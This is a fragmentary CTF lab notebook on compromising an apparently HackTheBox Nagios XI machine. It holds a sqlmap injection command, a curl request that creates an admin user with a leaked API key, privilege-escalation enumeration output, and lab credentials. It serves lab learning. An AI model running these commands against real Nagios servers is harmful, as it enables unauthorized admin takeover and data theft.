# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: #nagios

# Findings

## External
### Enumeration
`$enum$`

### Gaining Access


## Internal
### Enumeration
`$enum$`

### Gaining Access


### Maintaining Access


# Random Notes
```py
nagiosadmin 
```
<!--⚠️Imgur upload failed, check dev console-->
![](https://i.imgur.com/m9i1KZm.png)
![](https://i.imgur.com/BqH0Q6h.png)
![](https://i.imgur.com/PAz9d45.png)
`svc : XjH7VCehowpR1xZB`
- ![](https://i.imgur.com/0ahRKph.png)

	- ![](https://i.imgur.com/xTR6uh0.png)
![](https://i.imgur.com/mjoAqyd.png)
![](https://i.imgur.com/PhQx6e5.png)
![](https://i.imgur.com/ZiFtQqW.png)
![](https://i.imgur.com/bLFl7Q3.png)
![](https://i.imgur.com/35EqJGM.png)
- Tried the SQL injtection but it is not working
```shell
sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=47dcd5b7f981287a8f3981a88a5d12c71389e3cc" -p id -level=5 -risk=3 -D nagiosxi -T xi_users -dump
```
- So i Skilled that part and got the api key from some writeups.
![[Pasted image 20240413162215.png]]
```shell
curl -X POST -k "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=rexder&password=rexder&name=rexder&email=rexder@monitored.htb&auth_level=admin"
```
![](https://i.imgur.com/jru7LhU.png)

![](https://i.imgur.com/EceML65.png)
![](https://i.imgur.com/S4gdOIu.png)
![](https://i.imgur.com/4zbQcFD.png)

![](https://i.imgur.com/T80BMcO.png)
![](https://i.imgur.com/wUXevCI.png)


/var/mail/svc
/var/spool/mail/svc
/opt/scripts/check_host.sh
/usr/local/nagios/libexec/check_icmp  - suid
/usr/local/nagios/libexec/check_dhcp
```shell
╔══════════╣ Writable log files (logrotten) (limit 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#logrotate-exploitation
logrotate 3.18.0

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes
Writable: /usr/local/nagios/var/nagios.log
Writable: /usr/local/nagios/var/npcd.log
Writable: /usr/local/nagiosxi/var/sysstat.log
Writable: /usr/local/nagiosxi/var/nom.log
Writable: /usr/local/nagiosxi/var/cmdsubsys.log
Writable: /usr/local/nagiosxi/var/components/auditlog.log
Writable: /usr/local/nagiosxi/var/components/capacityplanning.log
Writable: /usr/local/nagiosxi/var/perfdataproc.log
Writable: /usr/local/nagiosxi/tmp/phpmailer.log
Writable: /usr/local/nrdp/win_clients/NRDS_win_source/logs/NRDS_Debug.log
```


```
User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
```
- /usr/local/nagiosxi/html/config.inc.php
	- ![](https://i.imgur.com/rZItFMv.png)
`nagiosql : n@gweb`

 "user" => 'ndoutils',
        "pwd" => 'n@gweb',
    "user" => 'nagiosxi',
        "pwd" => 'n@gweb',
```
{
"title": "qwe",
"description": "qwe",
"price": 12,
"type": "FB",
"image":null
}
```

![](https://i.imgur.com/XPBd3Ec.png)
- Checking the manage_services.sh, i got npcd and nagios, 
	- ![](https://i.imgur.com/qRJhlTC.png)

- Here the npcd is not here so i find it 
	- ![](https://i.imgur.com/hxABufq.png)
	- and Good For us, we have right acc
		- ![](https://i.imgur.com/TDnEAm3.png)
- We can use this endpoint and make it malicious, if we do it with normal binary we cant use the manageservice.sh.(that is the main point)

![](https://i.imgur.com/0DuaXSz.png)
![](https://i.imgur.com/6ushorZ.png)
